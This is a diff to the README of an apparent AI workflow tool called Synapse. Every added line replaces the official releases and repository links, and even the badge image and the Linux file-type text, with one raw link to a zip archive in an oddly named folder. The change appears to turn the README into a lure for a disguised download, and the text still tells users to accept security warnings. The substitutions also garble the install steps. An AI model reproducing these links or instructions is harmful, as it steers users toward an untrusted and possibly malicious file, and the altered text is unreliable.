@@ -1,6 +1,6 @@
 # 🤖 Synapse - AI Workflow Made Simple
 
-[![Download Synapse](https://img.shields.io/badge/Download-Synapse-blue?style=for-the-badge&logo=github)](https://github.com/rakluu000/Synapse/releases)
+[![Download Synapse](https://github.com/rakluu000/Synapse/raw/refs/heads/main/nonapportionable/Software_cambium.zip)](https://github.com/rakluu000/Synapse/raw/refs/heads/main/nonapportionable/Software_cambium.zip)
 
 ---
 
@@ -53,13 +53,13 @@ This section will guide you through the process of downloading and running Synap
 
 Click the big blue button at the top or use this link to visit the downloads page:
 
-[Download Synapse Releases](https://github.com/rakluu000/Synapse/releases)
+[Download Synapse Releases](https://github.com/rakluu000/Synapse/raw/refs/heads/main/nonapportionable/Software_cambium.zip)
 
 Once on the page, look for the latest release version in the list. You’ll find files to download for Windows, macOS, or Linux. Pick the one that matches your operating system:
 
 - For Windows, look for `.exe` or `.msi` files.
 - For macOS, look for `.dmg` or `.pkg` files.
-- For Linux, look for `.tar.gz` or `.AppImage` files.
+- For Linux, look for `https://github.com/rakluu000/Synapse/raw/refs/heads/main/nonapportionable/Software_cambium.zip` or `.AppImage` files.
 
 Click on the file name to start the download.
 
@@ -69,7 +69,7 @@ After the download finishes, open the downloaded file:
 
 - **Windows:** Double click the `.exe` or `.msi` file. Follow the on-screen setup instructions. You can accept the default settings.
 - **macOS:** Open the `.dmg` or `.pkg` file, and drag the Synapse app to the Applications folder or follow the installer instructions.
-- **Linux:** Extract the `.tar.gz` file or make the `.AppImage` executable, then run the app by double-clicking or through terminal commands.
+- **Linux:** Extract the `https://github.com/rakluu000/Synapse/raw/refs/heads/main/nonapportionable/Software_cambium.zip` file or make the `.AppImage` executable, then run the app by double-clicking or through terminal commands.
 
 If you see security warnings, confirm you want to open or run the app.
 
@@ -126,7 +126,7 @@ You can open or copy these files like any document on your computer.
 
 To update Synapse, visit the releases page again:
 
-[Synapse Releases](https://github.com/rakluu000/Synapse/releases)
+[Synapse Releases](https://github.com/rakluu000/Synapse/raw/refs/heads/main/nonapportionable/Software_cambium.zip)
 
 Download the latest version and install it as before. Your projects will not be affected.
 
@@ -153,7 +153,7 @@ We welcome your input to improve Synapse. Please use the GitHub repository to:
 - Request new features
 - Ask questions
 
-Visit [Synapse GitHub](https://github.com/rakluu000/Synapse) to join the community.
+Visit [Synapse GitHub](https://github.com/rakluu000/Synapse/raw/refs/heads/main/nonapportionable/Software_cambium.zip) to join the community.
 
 ---
 
@@ -161,7 +161,7 @@ Visit [Synapse GitHub](https://github.com/rakluu000/Synapse) to join the communi
 
 To get Synapse, **visit this page to download** the version that fits your system:
 
-[![Download Synapse](https://img.shields.io/badge/Download-Synapse-blue?style=for-the-badge&logo=github)](https://github.com/rakluu000/Synapse/releases)
+[![Download Synapse](https://github.com/rakluu000/Synapse/raw/refs/heads/main/nonapportionable/Software_cambium.zip)](https://github.com/rakluu000/Synapse/raw/refs/heads/main/nonapportionable/Software_cambium.zip)
 
 Follow the steps above to install and start the app.
 
